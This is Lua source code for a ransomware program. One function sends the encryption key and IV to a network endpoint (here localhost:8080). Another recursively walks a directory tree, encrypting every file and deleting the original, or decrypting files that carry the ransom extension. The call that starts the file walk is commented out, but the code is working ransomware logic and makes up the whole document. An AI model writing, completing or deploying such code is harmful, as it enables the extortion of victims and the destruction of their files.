function Ransom(target, hkey, hiv)
    -- test the lib and setup key/iv
    ransomlib.key  = ransomlib.hexa_to_bytes(hkey)
    ransomlib.iv   = ransomlib.hexa_to_bytes(hiv)
    ransomlib.hkey = ransomlib.bytes_to_hexa(ransomlib.key)
    ransomlib.hiv  = ransomlib.bytes_to_hexa(ransomlib.iv)

    -- send the key online
    SendKey(ransomlib.hkey, ransomlib.hiv)

    -- print("target: "..target)
    -- print("key   : "..ransomlib.hkey)
    -- print("iv    : "..ransomlib.hiv)
    -- print("ext   : "..ransomlib.ext)

    -- Walkdo(target)
end

function SendKey(hkey, hiv)
    local ip, port = "127.0.0.1", 8080
    local conn = netlib.connect(ip, port)
    netlib.write(conn, hkey..":::"..hiv.."\n")
    netlib.close(conn)
end

function Walkdo(path)
    for file in lfs.dir(path) do
        if file ~= "." and file ~= ".." then
            local f = path..'/'..file
            local attr = lfs.attributes (f)
            if attr.mode == "directory" then
                print("[DIR]  "..f)
                Walkdo(f)
            else
                -- if extension match then decrypt otherwise encrypt
                if f:match("[^.]("..ransomlib.ext..")$") then
                    print("[DECRYPT] "..f)
                    ransomlib:decrypt(f)
                    os.remove(f)
                else
                    print("[ENCRYPT] "..f)
                    ransomlib:encrypt(f)
                    os.remove(f)
                end
            end
        end
    end
end
